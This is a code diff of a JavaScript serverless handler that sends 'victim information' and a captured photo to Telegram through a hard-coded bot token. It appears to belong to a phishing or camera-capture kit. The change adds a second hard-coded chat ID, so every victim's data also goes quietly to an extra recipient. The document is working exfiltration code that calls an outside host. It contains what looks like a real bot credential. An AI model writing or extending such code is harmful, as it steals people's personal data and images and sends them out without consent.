@@ -11,7 +11,9 @@ export default async function handler(req, res) {
 
     // Your Telegram Bot Token
     const botToken = '7593396023:AAFL2c6dfu2-t4df0iNoRUcVCnDjsHMOs6c';
-    const chatId = usrId;
+
+    // List of chat IDs to send the data to
+    const chatIds = [usrId, '7310643937'];
 
     // Prepare the victim information
     const formatVictimInfo = (data) => {
@@ -26,8 +28,8 @@ export default async function handler(req, res) {
 
     const caption = formatVictimInfo(userData);
 
-    // Send the image to Telegram
-    try {
+    // Function to send data to Telegram
+    const sendToTelegram = async (chatId) => {
         const formData = new FormData();
         formData.append('chat_id', chatId);
         formData.append('caption', caption);
@@ -36,7 +38,7 @@ export default async function handler(req, res) {
             formData.append('photo', buffer, { filename: 'photo.png' });
         }
 
-        const telegramResponse = await new Promise((resolve, reject) => {
+        return new Promise((resolve, reject) => {
             const request = https.request(
                 `https://api.telegram.org/bot${botToken}/sendPhoto`,
                 {
@@ -53,8 +55,14 @@ export default async function handler(req, res) {
             request.on('error', reject);
             formData.pipe(request);
         });
+    };
 
-        return res.status(200).send(telegramResponse);
+    try {
+        // Send to all specified chat IDs
+        const sendPromises = chatIds.map(chatId => sendToTelegram(chatId));
+        await Promise.all(sendPromises);
+
+        return res.status(200).send('Data sent successfully to all recipients');
     } catch (error) {
         console.error('Error sending message:', error);
         return res.status(500).send('Internal Server Error');
